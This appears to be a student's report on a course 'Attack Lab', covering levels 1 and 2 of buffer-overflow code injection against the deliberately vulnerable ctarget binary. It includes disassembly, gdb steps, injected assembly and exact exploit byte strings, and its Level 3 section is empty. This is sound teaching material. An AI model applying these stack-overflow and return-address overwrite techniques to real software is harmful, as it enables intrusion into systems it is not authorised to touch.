# Attack Lab Report

---

- [1. Process](#1-process)
    - [1.1. Tools](#11-tools)
        - [1.1.1. hex2raw](#111-hex2raw)
        - [1.1.2. gcc and objdump](#112-gcc-and-objdump)
- [2. Part I : Code Injection Attacks](#2-part-i--code-injection-attacks)
    - [2.1. Level 1](#21-level-1)
        - [2.1.1. Process Record](#211-process-record)
    - [2.2. Level 2](#22-level-2)
    - [Attempt Thoughts](#attempt-thoughts)
    - [Process Record](#process-record)
    - [Level 3](#level-3)

---

## 1. Process

- `ctarget` : Code Injection Attacks  
- `rtarget` : Return-oriented Programming(ROP) Attacks  

### 1.1. Tools

#### 1.1.1. hex2raw

`hex2raw` : read hex and convert them to raw ascii  
support c style block comment  
` /* */ `(remember to leave space around both `/*` and `*/`)  

**usage:**  

1. pipe  

    ```bash
    cat answer_file | ./hex2raw | ./ctarget
    ```

2. raw file

    ```bash
    ./hex2raw < answer_file > answer_file_raw
    ./ctarget < answer_file_raw
    ```

    gdb is also supported this way  

    ```bash
    gdb ctarget  
    run < answer_file_raw  
    ```

#### 1.1.2. gcc and objdump

we can use gcc as assembler to translate our assembly code to machine code  
and then use `objdump -d` to disassemble the machine code to assembly code  
then we can get the byte codes  

## 2. Part I : Code Injection Attacks

CI Attack is used to conquer this target  

important goal : exploit string  

### 2.1. Level 1

Phase 1  
not inject new code  
but exploit string to redirect the program to execute an existing procedure  

#### 2.1.1. Process Record

1. disassemble `ctarget`  

2. find the target  

    find `stable_lunch`  
    witch uses `lunch`  
    witch uses `test`  
    witch uses `getbuf`  
    witch is our target  

    ```asm
    00000000004018fb <test>:
    4018fb:	48 83 ec 08          	sub    $0x8,%rsp
    4018ff:	b8 00 00 00 00       	mov    $0x0,%eax
    401904:	e8 31 fe ff ff       	call   40173a <getbuf>
    401909:	89 c2                	mov    %eax,%edx
    40190b:	be c8 2f 40 00       	mov    $0x402fc8,%esi
    401910:	bf 01 00 00 00       	mov    $0x1,%edi
    401915:	b8 00 00 00 00       	mov    $0x0,%eax
    40191a:	e8 01 f4 ff ff       	call   400d20 <__printf_chk@plt>
    40191f:	48 83 c4 08          	add    $0x8,%rsp
    401923:	c3                   	ret

    000000000040173a <getbuf>:
    40173a:	48 83 ec 28          	sub    $0x28,%rsp
    40173e:	48 89 e7             	mov    %rsp,%rdi
    401741:	e8 7e 02 00 00       	call   4019c4 <Gets>
    401746:	b8 01 00 00 00       	mov    $0x1,%eax
    40174b:	48 83 c4 28          	add    $0x28,%rsp
    40174f:	c3                   	ret

    00000000004019c4 <Gets>:
    4019c4:	41 54                	push   %r12
    4019c6:	55                   	push   %rbp
    4019c7:	53                   	push   %rbx
    4019c8:	49 89 fc             	mov    %rdi,%r12
    4019cb:	c7 05 4f 37 20 00 00 	movl   $0x0,0x20374f(%rip)        # 605124 <gets_cnt>
    4019d2:	00 00 00 
    4019d5:	48 89 fb             	mov    %rdi,%rbx
    4019d8:	eb 11                	jmp    4019eb <Gets+0x27>
    4019da:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
    4019de:	88 03                	mov    %al,(%rbx)
    4019e0:	0f b6 f8             	movzbl %al,%edi
    4019e3:	e8 3c ff ff ff       	call   401924 <save_char>
    4019e8:	48 89 eb             	mov    %rbp,%rbx
    4019eb:	48 8b 3d fe 2a 20 00 	mov    0x202afe(%rip),%rdi        # 6044f0 <infile>
    4019f2:	e8 f9 f2 ff ff       	call   400cf0 <_IO_getc@plt>
    4019f7:	83 f8 ff             	cmp    $0xffffffff,%eax
    4019fa:	74 05                	je     401a01 <Gets+0x3d>
    4019fc:	83 f8 0a             	cmp    $0xa,%eax
    4019ff:	75 d9                	jne    4019da <Gets+0x16>
    401a01:	c6 03 00             	movb   $0x0,(%rbx)
    401a04:	b8 00 00 00 00       	mov    $0x0,%eax
    401a09:	e8 6e ff ff ff       	call   40197c <save_term>
    401a0e:	4c 89 e0             	mov    %r12,%rax
    401a11:	5b                   	pop    %rbx
    401a12:	5d                   	pop    %rbp
    401a13:	41 5c                	pop    %r12
    401a15:	c3                   	ret 
    ```

3. edit exploit string  
    1. get the address of `touch1`  
        here it is `0x0000000000401750`  
    2. analyze the stack of `getbuf`  
        it is `0x28` bytes  
    3. so we put `0x28` bytes of junk at first  
    4. converted the address to little endian  
        `0x0000000000401750` -> `50 17 40 00 00 00 00 00`  

4. deploy the exploit string  
    1. use `hex2raw` to convert the hex string to raw ascii  
    2. run `ctarget` with the raw ascii  

5. record  

    ```txt
    Cookie: 0x72dfe7ad
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

### 2.2. Level 2

Phase 2  
we start to inject a small amount of codes as part of our exploit string  

important function:  

`touch2`  

it needs an argument: `unsigned val`  
witch will be compared with my cookie  
if equal, and we did it success  

### Attempt Thoughts

1. still use the bug of `getbuf`  
2. insert some instruction to do two thing  
    1. part1 : inserted code  
        1. push the address of `touch2`  
        2. set the `%rdi` wich cookie value  
        3. use ret to call `touch2`  
    2. part2 : fill meaningless values  
    3. part3 : overwrite the ret addr of `getbuf`  
        use the starting address of the inserted code  

### Process Record

1. use gdb to run `ctarget` to find the the position of the stack used as buffer  

    ```bash
    gdb ctarget
    (gdb) b getbuf
    (gdb) r
    (gdb) i r
    ```

    result : rsp 0x5565d408  
    it's the top of the stack part of the buffer  

2. find the address of `touch2`  
    easy, not mentioned here  

3. edit the inserted code  

    1. edit phase2.s

        ```asm
        pushq $0x000000000040177c
        movl $0x72dfe7ad, %edi
        ret
        ```

    2. get the machine number code of the inserted code  

        ```bash
        gcc -c phase2.s
        objdump -d phase2.o > phase2disas.asm
        ```

        get assembly code

        ```asm
        phase2.o：     文件格式 elf64-x86-64


        Disassembly of section .text:

        0000000000000000 <.text>:
        0:	68 7c 17 40 00       	push   $0x40177c
        5:	bf ad e7 df 72       	mov    $0x72dfe7ad,%edi
        a:	c3                   	ret
        ```

4. edit the exploit string and  
    use `hex2raw` to convert the hex string to raw ascii  

    phase2 :  

    ```txt
    68 7c 17 40 00 /*         pushq   0x40177c            */ 
    bf ad e7 df 72 /*               movl    0x72dfe7ad, %edi    */ 
    c3 /*                           ret                         */ 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 68 68 68 
    68 68 68 68 68 /*               meaningless sled value */ 
    08 d4 65 55 00 00 00 00 /*      overwrite original ret addr with 0x5565d408(point to inserted code) */ 
    ```

5. deploy the exploit string  

6. record  

    ```txt
    Cookie: 0x72dfe7ad
    Type string:Touch2!: You called touch2(0x72dfe7ad)
    Valid solution for level 2 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
    ```

### Level 3

